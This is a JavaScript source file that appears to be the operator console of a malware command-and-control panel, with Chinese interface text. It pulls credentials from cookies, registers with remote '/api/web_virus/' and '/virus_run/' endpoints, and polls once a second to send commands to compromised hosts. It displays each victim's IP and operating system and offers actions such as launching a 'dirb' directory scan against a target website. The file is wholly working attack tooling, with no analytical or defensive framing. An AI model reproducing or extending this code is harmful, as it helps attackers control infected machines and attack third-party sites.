
var get_message = null;
var user = getCookie("user");
var pwd = getCookie("pwd");
var command = 'none';
var send_ok = false;

function send_command(cmd) {
    command = cmd;
    try{
        get_message.send(JSON.stringify({"command": cmd}));
        print_log("发送命令: "+ command);
    } catch(e) {
        var loop = setInterval(function() {
            try {
                get_message.send(JSON.stringify({"command": command}));
                clearInterval(loop);
                return;
            }catch(e) {
                return;
            }
        } , 100)
    }
}

var hacker_driver_xhr = new XMLHttpRequest();
hacker_driver_xhr.open("GET", remote+ "/api/web_virus/"+user+"/"+pwd, true);
hacker_driver_xhr.send();
hacker_driver_xhr.onload = function() {
    var driver_code = hacker_driver_xhr.responseText;
    document.getElementById("driver_code").innerHTML = "识别码: "+ driver_code;
    print_log("驱动识别码加载成功")


    var local_fn = document.getElementById("local_fn");

    var run = setInterval(function() {

    try {
        get_message = new XMLHttpRequest();
        get_message.open(
            'POST',remote+"/virus_run/"+driver_code+"/" , true);
        get_message.send(JSON.stringify({"command": command}));
        command = 'none';
        get_message.onload = function() {
        var r = get_message.responseText;
        if (r.replace('\n','') != 'none'){
            document.getElementById("local_console").style.display = "block";
            document.getElementById("local_console_content").innerHTML = String(r).replaceAll("\n","<br />");
            console.log(r);
            try{
            var message = JSON.parse(r);
            if ("IP" in message && "os" in message) {
            document.getElementById("driver_ip").innerText = "IP: "+ message["IP"];
            document.getElementById("driver_os").innerText = "系统: "+ message["os"];
            local_fn.innerHTML = "";
            console.log(message);
            for (var i in message) {
            if (i != "IP" && i!= "os") {
                console.log(message[i]);
                (function(i){
                var dom = document.createElement("button");
                dom.innerText = i;
                dom.id = message[i]['Command'];
                dom.className = "btn_3";
                local_fn.appendChild(dom);

                dom.onclick = function() {
                    if (dom.id == 'dirb'){
                        showInputBox("输入参数","dirb" , "输入关于目标网站:", send_command);
                    }
                }
            }) (i) ;}
        }}
        else {
            showAlert_Console(r , null , function() {
                command = 'none';
            })
        } command = 'none'}catch(e){ return; }}
    } 
    }catch(e){
        return;
    }
    } , 1000);
}